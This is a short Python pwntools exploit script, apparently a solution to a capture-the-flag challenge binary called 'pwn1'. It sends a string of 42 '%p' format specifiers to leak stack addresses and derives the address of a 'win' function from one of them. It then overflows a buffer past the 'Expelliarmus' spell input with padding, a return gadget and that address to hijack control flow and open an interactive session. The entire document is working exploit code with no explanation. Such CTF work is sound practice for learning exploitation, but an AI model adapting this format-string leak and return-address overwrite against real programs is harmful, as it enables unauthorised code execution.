from pwn import *

p=process("./pwn1")
#p=remote("hax1.allesctf.net",9100)
main_win_offset=0x135
FStr="|".join(["%p" for _ in range(42)])
p.recvuntil("Enter your witch name:")
p.sendline(FStr)
leak=p.recvuntil("enter your magic spell:").split(b"|")
main=int(leak[-4],16)
win_addr=main-main_win_offset
ret_addr=win_addr+0x36
input('lalal')
spell=b"Expelliarmus\x00"
padding=b'X'*cyclic_find(b"cnaacoaa")
#cyc=cyclic(0xff+0xff)
#p.sendline(spell+cyc)
p.sendline(spell+padding+p64(ret_addr)+p64(win_addr))
p.interactive()